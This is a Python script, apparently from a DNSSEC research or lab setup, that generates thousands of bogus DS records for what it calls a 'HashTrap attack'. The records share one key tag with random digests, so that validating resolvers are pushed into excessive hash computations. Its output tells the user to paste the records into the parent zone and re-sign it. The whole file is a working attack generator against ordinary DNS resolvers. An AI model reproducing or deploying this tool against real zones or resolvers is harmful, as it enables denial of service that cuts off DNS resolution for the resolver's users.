
import os
import base64
import argparse

def generate_unique_bogus_digest(digest_type, index):
    """
    Generate a unique bogus digest (hex string) based on hash type and index.
    """
    digest_length = 0
    if digest_type == 1: # SHA1
        digest_length = 40
    elif digest_type == 2: # SHA256
        digest_length = 64
    elif digest_type == 4: # SHA384
        digest_length = 96
    else:
        raise ValueError("Unsupported Digest Type for bogus hash generation.")

    unique_hex = hex(index)[2:].upper()
    random_part_length = digest_length - len(unique_hex)
    if random_part_length < 0:
        # If index is too large for digest_length, just use the index and truncate/warn
        # For practical attacks, digest_length should be large enough for the number of records
        print(f"Warning: Index {index} is too large for digest_length {digest_length}. Digest will be truncated.")
        return unique_hex[:digest_length] # Truncate if index is too long
    
    random_bytes = os.urandom(random_part_length // 2) # Each byte is 2 hex chars
    random_hex_part = base64.b16encode(random_bytes).decode('utf-8') # Base16 for hex

    # Combine random part and unique index part
    # Ensure final length matches digest_length
    bogus_digest = (random_hex_part + unique_hex).rjust(digest_length, '0')[:digest_length]
    
    return bogus_digest

def create_bogus_ds_record(child_domain_name, target_key_tag, target_algorithm, target_digest_type, index):
    """
    """
    bogus_digest = generate_unique_bogus_digest(target_digest_type, index)

    ds_record_line = f"{child_domain_name} IN DS {target_key_tag} {target_algorithm} {target_digest_type} {bogus_digest}"
    return ds_record_line

# Default parameters
DEFAULT_CHILD_DOMAIN = "sub-x.a.test."
DEFAULT_KEY_TAG = 34029
DEFAULT_ALGORITHM = 14  # ECDSAP384SHA384
DEFAULT_DIGEST_TYPE = 2
DEFAULT_COUNT = 1000
DEFAULT_OUTPUT = None  # None means output to stdout

def parse_args():
    parser = argparse.ArgumentParser(description='Generate bogus DS records for HashTrap attack')
    parser.add_argument('-d', '--child-domain', type=str, default=DEFAULT_CHILD_DOMAIN,
                        help=f'Child domain name (default: {DEFAULT_CHILD_DOMAIN})')
    parser.add_argument('-k', '--key-tag', type=int, default=DEFAULT_KEY_TAG,
                        help=f'Target Key Tag (default: {DEFAULT_KEY_TAG})')
    parser.add_argument('-a', '--algorithm', type=int, default=DEFAULT_ALGORITHM,
                        help=f'Algorithm (default: {DEFAULT_ALGORITHM})')
    parser.add_argument('-t', '--digest-type', type=int, default=DEFAULT_DIGEST_TYPE,
                        help=f'Digest type: 1=SHA1, 2=SHA256, 4=SHA384 (default: {DEFAULT_DIGEST_TYPE})')
    parser.add_argument('-n', '--count', type=int, default=DEFAULT_COUNT,
                        help=f'Number of records to generate (default: {DEFAULT_COUNT})')
    parser.add_argument('-o', '--output', type=str, default=DEFAULT_OUTPUT,
                        help=f'Output file name (default: output to stdout)')
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_args()

    # Determine output target
    if args.output:
        fout = open(args.output, 'w')
    else:
        fout = None  # Use stdout

    def output(line):
        if fout:
            fout.write(line + '\n')
        else:
            print(line)

    try:
        # --- Generate and print the bogus DS records ---
        output(f"; Generated {args.count} bogus DS records for HashTrap attack on {args.child_domain}")
        output(f"; Target Key Tag: {args.key_tag}, Algorithm: {args.algorithm}, Digest Type: {args.digest_type}")
        output(f"; Copy these lines into your {args.child_domain.split('.')[-2]}.test.zone file (e.g., a.test.zone).")
        output(f"; Remember to re-sign the parent zone using dnssec-signzone with the parent KSK after adding these records.")
        output("")

        for i in range(args.count):
            output(create_bogus_ds_record(args.child_domain, args.key_tag, args.algorithm, args.digest_type, i))

        output("")
        output("; --- END OF GENERATED DS RECORDS ---")
    finally:
        if fout:
            fout.close()

# --- END OF FILE generate_fakeds.py ---